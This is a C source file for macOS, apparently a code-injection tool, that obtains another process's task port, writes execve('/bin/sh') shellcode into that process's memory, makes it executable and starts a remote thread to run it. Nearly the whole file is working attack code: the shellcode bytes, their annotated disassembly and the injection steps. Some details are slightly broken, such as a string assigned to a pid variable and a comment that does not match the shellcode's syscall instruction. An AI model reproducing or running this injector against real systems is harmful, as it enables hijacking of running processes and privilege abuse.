//
//  main.c
//  runtime injections
//
//  Created by A2nkF on 1/10/18.
//  Copyright © 2018 A2nkF. All rights reserved.
//

#include <stdio.h>
#include <mach/mach.h>
#include <spawn.h>

#include "tfp.c"

#ifndef STACK_SIZE
#define STACK_SIZE 0x40
#endif

int main(int argc, char * argv[]) {
    kern_return_t kr;
    pid_t pid = "38704"; // replace with pid of the process you want to inject into
    pid_t task;
    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
	  mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
	  x86_thread_state64_t remoteThreadState64;
	  thread_act_t remoteThread;

    // spawn a shell
    char shellcode[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x2f" \
    "\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2" \
    "\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05";
    // Little-Endian
    // xor     rsi,rsi                 ;zero out RSI
    // push    rsi                     ;push NULL on stack
    // mov     rdi, 0x68732f6e69622f2f ;mov //bin/sh string to RDI (reverse)
    // push    rdi                     ;push rdi to the stack
    // mov     rdi, rsp                ;store RSP (points to the command string) in RDI
    // xor     rdx, rdx                ;zero out RDX
    //
    // ;store syscall number on RAX
    // xor     rax,rax                 ;zero out RAX
    // mov     al,2                    ;put 2 to AL -> RAX = 0x0000000000000002
    // ror     rax, 0x28               ;rotate the 2 -> RAX = 0x0000000002000000
    // mov     al,0x3b                 ;move 3b to AL (execve SYSCALL#) -> RAX = 0x000000000200003b
    // int     0x80

    kr = task_for_pid(mach_task_self(), pid, &task);
    if(kr != KERN_SUCCESS){
      fail();
      printf("task_for_pid failed: %s\n", mach_error_string(kr));
      exit(kr);
    }
    info();
    printf("Task port: %d\n", task);

    pend();
    printf("Allocating remote stack... ");
    // allocate stack and code
    kr = mach_vm_allocate(task, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if(kr != KERN_SUCCESS){
      fail();
      puts("mach_vm_allocate STACK_SIZE failed");
      exit(-1);
    }
    goodn();

    pend();
    printf("Allocating remote shellcode... ");
    kr = mach_vm_allocate(task, &remoteCode64, sizeof(shellcode), VM_FLAGS_ANYWHERE);
    if(kr != KERN_SUCCESS){
      fail();
      puts("mach_vm_allocate shellcode failed");
      exit(-1);
    }
    goodn();

    pend();
    printf("Writing shellcode to memory... ");
    // write to the procs memory
    kr = mach_vm_write(task, remoteCode64, (vm_address_t)shellcode, sizeof(shellcode));
    if(kr != KERN_SUCCESS){
      fail();
      puts("mach_vm_write failed");
      exit(-1);
    }
    goodn();

    pend();
    printf("Changing permissions... ");
    // change page permissions
    kr = vm_protect(task, remoteCode64, sizeof(shellcode), FALSE, VM_PROT_READ|VM_PROT_EXECUTE);
    if(kr != KERN_SUCCESS){
      fail();
      puts("vm_protect failed");
      exit(-1);
    }
    goodn();

    pend();
    printf("Setting registers for remote thread...");
    remoteThreadState64.__rip = (u_int64_t) (vm_address_t) remoteCode64;
    remoteThreadState64.__rsp = (u_int64_t) remoteStack64;
    remoteThreadState64.__rbp = (u_int64_t) remoteStack64;
    goodn();

    pend();
    printf("Starting remote thread...");
    kr = thread_create_running(task, x86_THREAD_STATE64, (thread_state_t)&remoteThreadState64,
                          x86_THREAD_STATE64_COUNT, &remoteThread);
    if(kr != KERN_SUCCESS){
      fail();
      puts("thread_create_running  failed");
      exit(-1);
    }
    goodn();
    good();
    printf("Code injection was successful\n");
}
